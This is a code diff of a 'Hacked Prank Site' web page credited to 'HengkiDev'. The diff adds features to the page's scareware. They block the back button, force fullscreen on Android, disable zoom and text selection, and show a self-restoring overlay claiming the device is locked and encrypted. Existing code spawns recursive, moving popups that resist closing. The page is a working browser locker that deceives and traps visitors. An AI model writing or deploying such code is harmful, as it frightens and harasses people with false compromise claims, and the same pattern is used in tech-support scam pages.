@@ -2,7 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
     <title>Hacked Prank Site</title>
     <style>
         body {
@@ -15,6 +17,8 @@
             overflow: hidden;
             position: relative;
             animation: glitch 1s infinite;
+            -webkit-user-select: none; /* Prevent text selection */
+            user-select: none;
         }
 
         @keyframes glitch {
@@ -126,6 +130,44 @@
             100% { width: 0; }
         }
 
+        /* Persistent Popup Styles */
+        .persistent-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            color: #f00;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            pointer-events: auto;
+        }
+
+        .persistent-popup h2 {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #f00;
+            animation: glitch 0.5s infinite;
+        }
+
+        .persistent-popup p {
+            font-size: 1.2em;
+        }
+
+        /* Prevent back button visual */
+        .no-back {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            pointer-events: none;
+        }
+
         /* Responsive design */
         @media (max-width: 768px) {
             h1 {
@@ -140,6 +182,9 @@
             }
             .code-snippet, .cmd-window pre {
                 font-size: 0.6em;
+            }
+            .persistent-popup h2 {
+                font-size: 2em;
             }
         }
 
@@ -157,10 +202,14 @@
             .code-snippet, .cmd-window pre {
                 font-size: 0.5em;
             }
+            .persistent-popup h2 {
+                font-size: 1.5em;
+            }
         }
     </style>
 </head>
 <body>
+    <div class="no-back"></div>
     <h1>Your Device Has Been HACKED!</h1>
     <p class="hacker-text">Hacked by HengkiDev</p>
     <p>Enter the admin password to regain control: (Hint: admin123)</p>
@@ -187,6 +236,10 @@ C:\> shutdown /r /t 0
 System shutdown initiated...
         </pre>
     </div>
+    <div class="persistent-popup" id="annoying-popup" style="display: none;">
+        <h2>WARNING: SYSTEM COMPROMISED!</h2>
+        <p>HengkiDev has locked this device. You cannot escape!</p>
+    </div>
 
     <script>
         // Prevent closing without confirmation
@@ -194,24 +247,63 @@ System shutdown initiated...
             return "Are you sure you want to leave? Your device is under HengkiDev's control!";
         };
 
+        // Android-specific: Request fullscreen to trap user
+        function enterFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => console.log(err));
+            } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari, Android */
+                elem.webkitRequestFullscreen().catch(err => console.log(err));
+            }
+        }
+
+        // Prevent back navigation on Android
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, null, window.location.href);
+            createPersistentPopup(); // Reinforce popup on back attempt
+        };
+
         // Show password form after delay
         setTimeout(() => {
             document.getElementById('password-form').style.display = 'block';
         }, 2000);
+
+        // Create persistent popup
+        function createPersistentPopup() {
+            const popup = document.getElementById('annoying-popup');
+            popup.style.display = 'flex';
+            // Prevent closing by clicking outside
+            popup.onclick = (e) => e.stopPropagation();
+            // Attempt to re-show if closed
+            setInterval(() => {
+                if (popup.style.display !== 'flex') {
+                    popup.style.display = 'flex';
+                }
+            }, 500);
+        }
 
         // Function to check password
         function checkPassword() {
             const pass = document.getElementById('password').value;
             if (pass === 'admin123') {
                 alert('Access Granted! Prank over. :)');
-                // Allow normal close after success
+                // Allow normal close and exit
                 window.onbeforeunload = null;
-                // Remove all code snippets and cmd window
+                window.onpopstate = null;
+                document.getElementById('annoying-popup').remove();
                 document.querySelectorAll('.code-snippet').forEach(code => code.remove());
                 document.querySelectorAll('.cmd-window').forEach(cmd => cmd.remove());
+                // Exit fullscreen
+                if (document.exitFullscreen) {
+                    document.exitFullscreen().catch(err => console.log(err));
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen().catch(err => console.log(err));
+                }
             } else {
                 alert('Wrong Password! HengkiDev is unleashing more malware popups...');
                 spamPopups();
+                createPersistentPopup(); // Show persistent popup on wrong password
             }
         }
 
@@ -226,7 +318,7 @@ System shutdown initiated...
                 '<h1>CRITICAL!</h1><p>HengkiDev is watching you!</p>',
                 '<h1>LOCKED!</h1><p>System encrypted by HengkiDev!</p>'
             ];
-            for (let i = 0; i < 15; i++) {  // Increased to 15 popups
+            for (let i = 0; i < 15; i++) {
                 const popup = window.open('', '_blank', `width=${Math.random() * 400 + 200},height=${Math.random() * 300 + 200},top=${Math.random() * (window.screen.height - 300)},left=${Math.random() * (window.screen.width - 400)}`);
                 if (popup) {
                     popup.document.write(`
@@ -246,17 +338,14 @@ System shutdown initiated...
                             }, ${Math.random() * 3000 + 2000});
                         </script>
                     `);
-                    // Prevent closing
                     popup.onbeforeunload = function() {
                         return "HengkiDev won't let you close this!";
                     };
-                    // Make popups move randomly
                     popup.setInterval(() => {
                         popup.moveTo(Math.random() * (window.screen.width - 400), Math.random() * (window.screen.height - 300));
                     }, 500);
                 }
             }
-            // Recursive spam every 2 seconds (faster)
             setTimeout(spamPopups, 2000);
         }
 
@@ -278,18 +367,21 @@ System shutdown initiated...
             snippet.className = 'code-snippet';
             snippet.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
             snippet.style.left = Math.random() * window.innerWidth + 'px';
-            snippet.style.animationDuration = Math.random() * 5 + 5 + 's'; // Random fall speed between 5-10s
+            snippet.style.animationDuration = Math.random() * 5 + 5 + 's';
             codeBackground.appendChild(snippet);
-            // Remove snippet after animation
             setTimeout(() => snippet.remove(), 10000);
         }
 
         // Start code rain
         setInterval(spawnCodeRain, 200);
 
-        // Start initial spam after load
+        // Start initial spam and fullscreen
         window.onload = function() {
-            setTimeout(spamPopups, 500); // Start faster
+            setTimeout(spamPopups, 500);
+            if (/Android/i.test(navigator.userAgent)) {
+                enterFullscreen();
+                createPersistentPopup();
+            }
         };
     </script>
 </body>
